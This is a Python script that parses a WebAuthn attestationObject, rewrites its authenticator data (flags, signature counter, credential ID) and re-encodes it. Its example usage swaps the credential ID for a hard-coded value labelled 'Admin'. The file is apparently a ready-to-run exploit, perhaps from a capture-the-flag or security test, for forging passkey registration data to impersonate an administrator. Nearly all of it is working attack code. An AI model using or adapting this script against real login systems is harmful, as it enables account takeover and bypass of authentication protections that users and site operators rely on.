import base64
import cbor2
import struct

def b64url_decode(data):
    data += '=' * ((4 - len(data) % 4) % 4)
    return base64.urlsafe_b64decode(data)

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')

def parse_attestation_object(attestation_b64):
    att_bytes = b64url_decode(attestation_b64)
    att = cbor2.loads(att_bytes)

    fmt = att.get('fmt')
    authData = att.get('authData')
    attStmt = att.get('attStmt')

    # print(f"Attestation Format: {fmt}")
    # print(f"authData length: {len(authData)} bytes")

    rp_id_hash = authData[0:32]
    flags = authData[32]
    sign_count = struct.unpack('>I', authData[33:37])[0]

    print(f"RP ID hash: {rp_id_hash.hex()}")
    print(f"Flags: {flags:08b}")
    print(f"Signature counter: {sign_count}")

    # Only if attested credential present
    aaguid = cred_id = public_key_bytes = public_key = None
    if flags & 0x40:
        aaguid = authData[37:53]
        cred_id_len = struct.unpack('>H', authData[53:55])[0]
        cred_id = authData[55:55+cred_id_len]
        public_key_bytes = authData[55+cred_id_len:]
        public_key = cbor2.loads(public_key_bytes)
        print(f"AAGUID: {aaguid.hex()}")
        print(f"Credential ID: {cred_id.hex()}")
        print(f"Public Key: {public_key}")

    return {
        'attestation': att,
        'authData': authData,
        'rp_id_hash': rp_id_hash,
        'flags': flags,
        'sign_count': sign_count,
        'aaguid': aaguid,
        'cred_id': cred_id,
        'public_key_bytes': public_key_bytes,
        'public_key': public_key
    }

def modify_authData(auth_dict, new_flags=None, new_sign_count=None, new_cred_id=None):
    authData = bytearray(auth_dict['authData'])
    flags = auth_dict['flags']
    sign_count = auth_dict['sign_count']

    # Parse credential segments
    has_cred_data = flags & 0x40
    if has_cred_data:
        aaguid = authData[37:53]
        cred_id_len = struct.unpack('>H', authData[53:55])[0]
        cred_id = authData[55:55+cred_id_len]
        public_key_bytes = authData[55+cred_id_len:]

    # Modify flags
    if new_flags is not None:
        authData[32] = new_flags
        print(f"Modified flags: {new_flags:08b}")

    # Modify signature counter
    if new_sign_count is not None:
        authData[33:37] = struct.pack('>I', new_sign_count)
        print(f"Modified counter: {new_sign_count}")

    # Modify credential ID if present
    if has_cred_data and new_cred_id is not None:
        new_len = len(new_cred_id)
        authData[53:55] = struct.pack('>H', new_len)
        authData[55:55+new_len] = new_cred_id
        authData[55+new_len:] = public_key_bytes  # preserve public key
        print(f"Modified Credential ID: {new_cred_id.hex()}")

    return bytes(authData)

def repackage_attestation(auth_dict, modified_authData):
    # Replace authData in original attestation object
    att = auth_dict['attestation']
    att['authData'] = modified_authData
    repacked = cbor2.dumps(att)
    return b64url_encode(repacked)

# -----------------------
# Example usage
# -----------------------

attestation_b64 = input("Base64url attestationObject: ").strip()

parsed = parse_attestation_object(attestation_b64)

# Example modifications

# Admin
modified_authData = modify_authData(parsed, new_cred_id=bytes.fromhex("0d4bc5842de8892dc6f1a3bad5de6150c01e8662")) # Set credential ID to Admin

new_attestation_b64 = repackage_attestation(parsed, modified_authData)
print(f"Modified attestationObject (base64url): {new_attestation_b64}")
